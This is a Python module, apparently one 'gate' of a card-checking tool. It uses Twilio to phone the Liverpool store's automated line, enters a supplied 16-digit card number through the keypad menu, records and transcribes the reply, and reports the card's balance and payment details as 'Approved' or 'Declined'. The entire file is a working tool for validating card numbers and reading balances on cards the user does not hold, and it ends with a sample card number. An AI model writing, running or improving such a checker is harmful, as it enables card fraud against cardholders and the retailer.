# Pure gate motor for 'liverpool' — Liverpool (saldo) via Twilio IVR + speech transcription.
# Source: new_gates/saldoL.py

import os
import re
import tempfile
import time

import requests

_GATEWAY = 'Liverpool Saldo (IVR)'

TWILIO_ACCOUNT_SID = os.getenv('TWILIO_ACCOUNT_SID', '').strip()
TWILIO_AUTH_TOKEN = os.getenv('TWILIO_AUTH_TOKEN', '').strip()
TWILIO_PHONE_NUMBER = os.getenv('TWILIO_PHONE_NUMBER', '').strip()
LIVERPOOL_NUMBER = '5552629999'


def _save_a(recording_sid):
    from twilio.rest import Client
    client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
    try:
        recording = client.recordings(recording_sid).fetch()
        url = f'https://api.twilio.com{recording.uri.replace(".json", ".wav")}'
        resp = requests.get(url, auth=(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN), timeout=30)
        if resp.status_code == 200:
            tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.wav')
            tmp.write(resp.content)
            tmp.close()
            return tmp.name
    except Exception:
        pass
    return None


def _ffmpeg():
    import subprocess
    try:
        subprocess.run(['ffmpeg', '-version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                       timeout=5, check=True)
        return True
    except Exception:
        return False


def _sp_audio(recording_sid):
    import os as _os
    import speech_recognition as sr
    from pydub import AudioSegment
    path = _save_a(recording_sid)
    if not path:
        return None
    processed = None
    try:
        if _ffmpeg():
            audio = AudioSegment.from_file(path)
            audio = audio.set_channels(1).set_frame_rate(16000)
            processed = tempfile.NamedTemporaryFile(delete=False, suffix='.wav')
            audio.export(processed.name, format='wav')
            path_to_use = processed.name
        else:
            path_to_use = path
        r = sr.Recognizer()
        with sr.AudioFile(path_to_use) as source:
            r.adjust_for_ambient_noise(source, duration=0.5)
            audio_data = r.record(source)
        return r.recognize_google(audio_data, language='es-MX')
    except Exception:
        return None
    finally:
        for p in [path, processed.name] if processed else [path]:
            if p and _os.path.exists(p):
                try:
                    _os.unlink(p)
                except Exception:
                    pass


def _dataE(texto):
    if not texto:
        return {}
    t = texto.lower()
    saldos = {}
    match = re.search(r'saldo\s+al\s+último\s+corte.*?([\d,]+\.?\d*)', t)
    if match:
        saldos['saldo_corte'] = match.group(1).replace(',', '')
    match = re.search(r'saldo\s+(al\s+)?d[íi]a\s+(de\s+)?hoy.*?([\d,]+\.?\d*)', t)
    if match:
        saldos['saldo_hoy'] = match.group(3).replace(',', '')
    match = re.search(r'pago\s+m[íi]nimo.*?([\d,]+\.?\d*)', t)
    if match:
        saldos['pago_minimo'] = match.group(1).replace(',', '')
    match = re.search(r'pago\s+(para\s+no\s+generar\s+intereses|sin\s+intereses).*?([\d,]+\.?\d*)', t)
    if match:
        saldos['pago_sin_intereses'] = match.group(2).replace(',', '')
    match = re.search(r'fecha\s+l[íi]mite.*?(\d+\s+de\s+[a-z]+)', t)
    if match:
        saldos['fecha_limite'] = match.group(1).strip()
    return saldos


def _flow(tarjeta_16_digitos):
    if not re.match(r'^\d{16}$', tarjeta_16_digitos):
        return {'status': True, 'success': False, 'response': 'Declined ❌ | Tarjeta debe tener 16 dígitos'}
    if not (TWILIO_ACCOUNT_SID and TWILIO_AUTH_TOKEN and TWILIO_PHONE_NUMBER):
        return {'status': False,
                'raise': 'Twilio no configurado — define TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN y TWILIO_PHONE_NUMBER en .env'}
    try:
        from twilio.rest import Client
        client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
        call = client.calls.create(to=f'+52{LIVERPOOL_NUMBER}', from_=TWILIO_PHONE_NUMBER,
                                   twiml='<Response><Pause length="120"/></Response>', record=True)
        call_sid = call.sid
        time.sleep(8)

        def enviar(digitos, desc=''):
            try:
                client.calls(call_sid).update(twiml=f'<Response><Play digits="{digitos}"/><Pause length="30"/></Response>')
                time.sleep(3)
            except Exception:
                pass

        enviar('2', 'Menú principal')
        time.sleep(5)
        enviar('2', 'Consulta de saldo')
        time.sleep(15)
        enviar('1', 'Confirmar opción')
        time.sleep(5)
        enviar(tarjeta_16_digitos, f'Tarjeta completa: {tarjeta_16_digitos}')
        time.sleep(25)
        client.calls(call_sid).update(status='completed')
        time.sleep(10)
        recordings = client.recordings.list(call_sid=call_sid, limit=1)
        if not recordings:
            return {'status': True, 'success': False, 'response': 'Declined ❌ | No se grabó audio'}
        transcripcion = _sp_audio(recordings[0].sid)
        if not transcripcion:
            return {'status': True, 'success': False, 'response': 'Declined ❌ | No se pudo transcribir'}
        datos = _dataE(transcripcion)
        if not datos:
            return {'status': True, 'success': False, 'response': f'Declined ❌ | Sin saldo detectable: {transcripcion}'}
        return {'status': True, 'success': True,
                'response': f'Approved ✅ | ' + ' | '.join(f'{k}: {v}' for k, v in datos.items())}
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}


def _checker(cc, bin_data, number=''):
    card_number = cc[0] if not number else number
    try:
        return _flow(card_number)
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}


def run_check(cc, bin_data, ctx=None):
    ctx = ctx or {}
    r = _checker(cc, bin_data, number=(ctx.get('number') or '').strip())
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}


if __name__ == '__main__':
    print(run_check(['4178490025430225', '08', '29', '000'], ''))